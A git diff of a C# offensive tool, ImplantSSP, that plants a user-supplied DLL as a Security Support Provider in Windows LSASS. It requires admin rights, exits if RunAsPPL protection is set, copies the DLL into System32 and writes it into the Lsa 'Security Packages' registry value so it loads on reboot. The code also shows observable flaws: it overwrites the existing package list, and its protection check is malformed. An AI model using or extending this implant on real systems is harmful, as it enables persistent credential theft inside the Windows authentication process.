@@ -3,9 +3,6 @@ using System;
 using System.IO;
 using System.Security.Principal;
 
-//Shout out to Matt Graeber
-//DLL must export SpLsaModeInitialize
-
 namespace ImplantSSP
 {
     class Program
@@ -26,6 +23,7 @@ namespace ImplantSSP
             return machineType;
         }
 
+        
         //Only supporting x86 and x64
         public enum MachineType : ushort
         {
@@ -34,18 +32,18 @@ namespace ImplantSSP
             IMAGE_FILE_MACHINE_IA64 = 0x200,
         }
 
+        public static string osArch = null;
+
         public static void PreflightChecks(string dllPath)
         {
-            #region Functionality Checks
             WindowsIdentity identity = WindowsIdentity.GetCurrent();
             WindowsPrincipal principal = new WindowsPrincipal(identity);
             if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
             {
                 Console.WriteLine("[-] You do not have admin privileges. Exiting.");
-                //Environment.Exit(1);
+                Environment.Exit(1);
             }
             //Get OS arch
-            string osArch = null;
             if (!string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
             {
                 Console.WriteLine("[+] Detected x86 system architecture.");
@@ -69,15 +67,11 @@ namespace ImplantSSP
                 Console.WriteLine("[+] Detected DLL x64 DLL architecture");
                 dllArch = "x64";
             }
-
             //Check for architecture match
             if (!dllArch.Equals(osArch))
             {
                 Console.WriteLine("[-] Detected architecture mismatch. Make sure your DLL architecture matches the host's.");
             }
-            #endregion Funcitonality Checks
-
-            #region Defensive Checks
             RegistryKey runAsPPL = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL");
             string runAsPPLVal = Convert.ToString(runAsPPL);
             if (String.IsNullOrEmpty(runAsPPLVal))
@@ -87,29 +81,46 @@ namespace ImplantSSP
             else
             {
                 Console.WriteLine("[-] RunAsPPL registry key set. Exiting...");
-                //Environment.Exit(1);
+                Environment.Exit(1);
             }
-            //HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL
-            #endregion Defensive Checks
-
         }
-
 
         static void Main(string[] args)
         {
+            if (args.Length == 0)
+            {
+                Console.WriteLine("[-] Please provide the path to your DLL");
+                Environment.Exit(1);
+            }
             string dllPath = args[0]; //First arg needs to be the path to our DLL
             PreflightChecks(dllPath);
-            
+            Console.WriteLine("[+] Safety checks passed. Implanting your DLL");
 
-            //Check if the DLL is in the currently installed SSPs via the registry
-            //Check the installation directory to see if the DLL exists there
+            string dllName = Path.GetFileName(dllPath);
+            string writePath = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + dllName;
+            Console.WriteLine("[+] Writing {0} to {1}", dllName, writePath);
+            try
+            {
+                File.Copy(dllPath, writePath, true); //Overload will overwrite the file if it already exists
+                Console.WriteLine("[+] File written successfully");
+            }
+            catch
+            {
+                //In testing, this happened because a file of the same name was already loaded by LSASS and running
+                Console.WriteLine("[-] Couldn't write the file...");
+            }
 
-
-            //Handle Sysnative
-
-            //Set the registry key
-            //User secur32!AddSecurityPackage to build the package from the DLL
-            
+            Console.WriteLine("[+] Adding your DLL to the LSA Security Packages registry key");
+            RegistryKey securityPackages = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Lsa",true);
+            try
+            {
+                securityPackages.SetValue("Security Packages", Path.GetFileNameWithoutExtension(dllPath));
+                Console.WriteLine("[+] Registry key set. DLL will be loaded on reboot.");
+            }
+            catch
+            {
+                Console.WriteLine("[-] Unable to set registry key.");
+            }
             Console.ReadLine();
         }
     }
